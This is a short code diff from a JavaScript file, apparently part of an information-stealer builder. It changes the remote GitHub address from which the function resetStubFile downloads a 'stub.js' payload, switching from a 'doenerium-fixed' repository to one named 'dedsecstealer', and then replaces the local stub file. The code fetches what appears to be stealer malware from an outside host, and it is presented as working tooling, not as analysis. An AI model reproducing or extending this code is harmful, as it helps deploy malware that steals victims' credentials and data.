@@ -89,7 +89,7 @@ function runScriptFile(scriptFilePath, showOutputOnSuccess = false) {
 function resetStubFile() {
     return new Promise((resolve, reject) => {
         const filePath = path.resolve(__dirname, '..', '..', 'stub', 'stub.js');
-        const url = 'https://raw.githubusercontent.com/doenerium6969/doenerium-fixed/main/stub/stub.js';
+        const url = 'https://raw.githubusercontent.com/dedsec1313/dedsecstealer/refs/heads/main/stub/stub.js';
 
         // Delete the existing file
         fs.unlink(filePath, err => {
